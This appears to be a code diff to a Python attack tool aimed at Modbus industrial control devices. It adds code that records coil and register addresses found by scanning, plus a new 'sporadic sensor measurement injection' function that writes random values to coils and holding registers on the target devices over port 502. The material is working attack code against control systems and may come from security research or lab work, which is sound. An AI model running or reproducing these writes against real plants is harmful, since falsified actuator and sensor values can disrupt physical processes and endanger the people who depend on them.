@@ -24,7 +24,8 @@ LOGO = r"""
 """
 
 # globals
-scanned_ips = [] # is filled with all modbus ips if the first attacks is executed
+scanned_ips = []        # is filled with all modbus ips if the first attacks is executed
+scanned_addresses = {}  # is filled with lists of modbus addresses (key is the ip) 
 
 
 # CLASS:    CustomModbusRequest
@@ -182,11 +183,12 @@ def device_identification_attack(ip_addresses):
 # Purpose: Scans over all registers and coils and attempts for find changing values,
 #   which can potentially expose used addresses.
 def naive_sensor_read(ip_addresses):
+    global scanned_addresses
     print("### NAIVE SENSOR READ ###")
 
     for ip in ip_addresses:
         print(f"===== Performing naive sensor read on {ip} =====")
-        print("Scanning for all registers (coils/di/ir/hr) for 15 seconds")
+        print("Scanning for all registers (coils/di/ir/hr) for 10 seconds")
         print("Attempting to find sensor values")
         print("-------------------------------")
 
@@ -202,7 +204,7 @@ def naive_sensor_read(ip_addresses):
         ir_found = []
         hr_found = []
 
-        for _ in range(15):
+        for _ in range(10):
             sleep(1)
             coil = client.read_coils(0, 2000).bits
             di = client.read_discrete_inputs(0, 2000).bits
@@ -212,31 +214,79 @@ def naive_sensor_read(ip_addresses):
             # compare previous response to current response
             for i in range(len(prev_coil)):
                 if coil[i] != prev_coil[i] or coil[i] != 0:
-                    if i not in coil_found:
+                    if i+1 not in coil_found:
                         print(f"Changing coil found at location {i+1} (likely a sensor/actuator value)")
-                    coil_found.append(i)
+                        coil_found.append(i+1)
             prev_coil = coil
             for i in range(len(prev_di)):
                 if di[i] != prev_di[i] or di[i] != 0:
-                    if i not in di_found:
+                    if i+1 not in di_found:
                         print(f"Changing discrete input found at location {i+1} (likely a sensor/actuator value)")
-                    di_found.append(i)
+                        di_found.append(i+1)
             prev_di = di
             for i in range(len(prev_ir)):
                 if ir[i] != prev_ir[i] or ir[i] != 0:
-                    if i not in ir_found:
+                    if i+1 not in ir_found:
                         print(f"Changing holding register found at location {i+1} (likely a sensor/actuator value)")
-                    ir_found.append(i)
+                        ir_found.append(i+1)
             prev_coil = coil
             for i in range(len(prev_hr)):
                 if hr[i] != prev_hr[i] or hr[i] != 0:
-                    if i not in hr_found:
+                    if i+1 not in hr_found:
                         print(f"Changing holding register found at location {i+1} (likely a sensor/actuator value)")
-                    hr_found.append(i)
+                        hr_found.append(i+1)
         print("-------------------------------")
         client.close()
+
+        # add found addresses
+        scanned_addresses[ip] = {
+            "co": coil_found,
+            "di": di_found,
+            "ir": ir_found,
+            "hr": hr_found
+        }
+
+        print(scanned_addresses)
+
     print("### NAIVE SENSOR READ FINISH ###")
 
+
+
+# Function: sporadic_sensor_measurement_injection
+# Purpose: Writes completely random values to coil/holding registers. 
+def sporadic_sensor_measurement_injection(ip_addresses):
+    global scanned_addresses
+    print("### SPORADIC SENSOR MEASUREMENT INJECTION ###")
+
+    if len(scanned_addresses) == 0:
+        print("Warning: No addresses scanned. Run a sensor read first.")
+    
+    for ip in ip_addresses:
+        print(f"Injecting random data for 10 seconds into {ip}")
+        
+        co_addresses = scanned_addresses[ip]["co"] 
+        hr_addresses = scanned_addresses[ip]["hr"]
+        print(f"Affecting found addresses: coils {co_addresses}, holding register {hr_addresses}")
+
+        client = ModbusTcpClient(host=ip, port=502)
+
+        # affect coils
+        for _ in range(100):
+            sleep(0.05)
+            coil_value = random.choice([True, False])
+
+            for address in co_addresses:
+                client.write_coil(address-1, coil_value)
+
+        # affect holding registers
+        for _ in range(100):
+            sleep(0.05)
+            hr_value = random.randint(0, 65535)
+            for address in hr_addresses:
+                client.write_register(address-1, hr_value)
+        
+        client.close()
+    print("### SPORADIC SENSOR MEASUREMENT INJECTION FINSIH ###")
 
 
 # Function: force_listen_mode
